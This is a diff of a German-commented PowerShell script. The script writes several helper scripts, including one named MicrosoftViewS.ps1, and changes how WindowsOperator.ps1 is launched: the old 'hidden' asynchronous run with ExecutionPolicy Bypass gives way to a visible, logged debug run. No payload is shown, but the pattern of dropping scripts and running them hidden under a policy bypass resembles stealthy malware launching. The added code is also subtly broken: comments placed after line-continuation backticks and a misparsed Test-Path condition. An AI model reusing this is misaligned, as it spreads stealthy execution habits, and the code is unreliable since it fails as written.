@@ -1273,11 +1273,50 @@ Write-Output "System.ps1 in $systemScriptPath geschrieben."
 [IO.File]::WriteAllText($microsoftViewSScriptPath, $microsoftViewSScriptContent, [System.Text.Encoding]::UTF8)
 Write-Output "MicrosoftViewS.ps1 in $microsoftViewSScriptPath geschrieben."
 # Alle Dateien sind jetzt geschrieben – WindowsOperator.ps1 ausführen (hidden, non-blocking)
+$logDir = "$env:USERPROFILE\Desktop\DebugLogs"
+if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force | Out-Null }
+$outputLog = Join-Path $logDir "Operator_Output_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
+$errorLog = Join-Path $logDir "Operator_Error_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
+
+# Korrigierter Pfad (angenommen Operator, nicht System)
+$scriptToRun = $operatorScriptPath  # Oder $systemScriptPath, falls gemeint
+
+Write-Output "Debugging-Modus aktiviert. Starte sichtbar: $scriptToRun"
+Write-Output "Logs: $outputLog | $errorLog"
+
 try {
-    Start-Process powershell.exe -ArgumentList " -ExecutionPolicy Bypass -File `"$systemScriptPath`"" 
-    Write-Output "WindowsOperator.ps1 wurde hidden und asynchron ausgeführt."
+    # Sichtbar + Verbose/Debug + Redirect für Logs (TROTZDEM visible Fenster)
+    $process = Start-Process -FilePath "powershell.exe" `
+                             -ArgumentList "-ExecutionPolicy Bypass -Verbose -Debug -File `"$scriptToRun`"" `
+                             -WindowStyle Normal `  # Sichtbar!
+                             -RedirectStandardOutput $outputLog `
+                             -RedirectStandardError $errorLog `
+                             -PassThru  # Gibt Process-Objekt zurück für Wait
+
+    Write-Output "Prozess gestartet (PID: $($process.Id)). Warte auf Abschluss..."
+    $process.WaitForExit()  # Blockt, bis fertig – sieh live Outputs im Fenster + Logs
+
+    # Nach Abschluss: Logs anzeigen
+    if (Test-Path $outputLog) {
+        Write-Output "`n=== OUTPUT LOG ==="
+        Get-Content $outputLog
+    }
+    if (Test-Path $errorLog -and (Get-Item $errorLog).Length -gt 0) {
+        Write-Output "`n=== ERROR LOG ==="
+        Get-Content $errorLog
+    }
+    Write-Output "Prozess beendet (ExitCode: $($process.ExitCode))."
 } catch {
-    Write-Output "Fehler beim Ausführen von WindowsOperator.ps1: $_"
+    Write-Output "Start-Fehler: $($_.Exception.Message)"
+    Write-Output "StackTrace: $($_.ScriptStackTrace)"
+    
+    # Fallback: Direkter Aufruf für noch mehr Visibility
+    Write-Output "Fallback: Direkter Aufruf..."
+    try {
+        & $scriptToRun -Verbose -Debug  # Läuft im aktuellen Kontext – alle Outputs hier
+    } catch {
+        Write-Output "Direkter Aufruf-Fehler: $_"
+    }
 }
 # ==================== HAUPTFENSTER ====================
 $form = New-Object System.Windows.Forms.Form
